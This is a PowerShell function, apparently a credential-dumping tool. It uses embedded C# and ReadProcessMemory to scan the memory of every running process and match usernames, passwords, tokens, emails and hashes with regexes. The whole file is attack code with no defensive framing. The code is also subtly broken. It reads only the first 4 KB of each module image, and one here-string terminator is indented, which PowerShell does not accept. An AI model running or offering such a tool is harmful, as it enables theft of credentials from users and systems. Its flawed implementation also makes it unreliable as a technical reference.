function Invoke-CredentialScanner {

    $asciiart = @"
    [ Memory Credential Scanner ]
    "@
    Write-Output $asciiart

    Add-Type -TypeDefinition @"
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Text.RegularExpressions;

    public class MemoryInspector {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        public static List<string> InspectProcess(Process process, Regex[] regexPatterns) {
            List<string> results = new List<string>();
            try {
                IntPtr processHandle = OpenProcess(0x0010 | 0x0400, false, process.Id);
                if (processHandle == IntPtr.Zero) return results;

                foreach (ProcessModule module in process.Modules) {
                    try {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        if (ReadProcessMemory(processHandle, module.BaseAddress, buffer, (uint)buffer.Length, out bytesRead)) {
                            string memoryContent = Encoding.ASCII.GetString(buffer);
                            foreach (Regex regex in regexPatterns) {
                                MatchCollection matches = regex.Matches(memoryContent);
                                foreach (Match match in matches) {
                                    results.Add($"[{process.ProcessName}] {match.Value}");
                                }
                            }
                        }
                    } catch {
                        continue;
                    }
                }
                CloseHandle(processHandle);
            } catch {
                results.Add($"Error inspecting process {process.ProcessName}.");
            }
            return results;
        }
    }
"@

    # Define regex patterns for credentials
    $regexPatterns = @(
        '(?i)(?:username|user|login|email|usr)[^\r\n]{0,30}[:=\s][^\r\n\s]{3,50}', # Usernames or emails
        '(?i)(?:password|pass|pwd|key|token)[^\r\n]{0,30}[:=\s][^\r\n\s]{3,50}',  # Passwords or tokens
        '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b',                    # Email addresses
        '\b[A-Fa-f0-9]{32}\b',                                                 # API keys or MD5-like hashes
        '\b[A-Fa-f0-9]{40}\b',                                                 # SHA-1-like hashes
        '\b[A-Za-z0-9_]{20,}\b'                                                # Access tokens or long strings
    ) | ForEach-Object { [Regex]::new($_) }

    # Iterate over processes and analyze memory
    $results = @()
    foreach ($process in Get-Process) {
        try {
            Write-Host "Inspecting process: $($process.ProcessName) (ID: $($process.Id))"
            $matches = [MemoryInspector]::InspectProcess($process, $regexPatterns)
            $results += $matches
        } catch {
            Write-Host "Skipping process: $($process.ProcessName) due to access issues."
        }
    }

    # Output results
    if ($results.Count -eq 0) {
        Write-Output "No potential credentials found."
    } else {
        Write-Output "Potential credentials found:"
        $results | ForEach-Object { Write-Output $_ }
    }
}
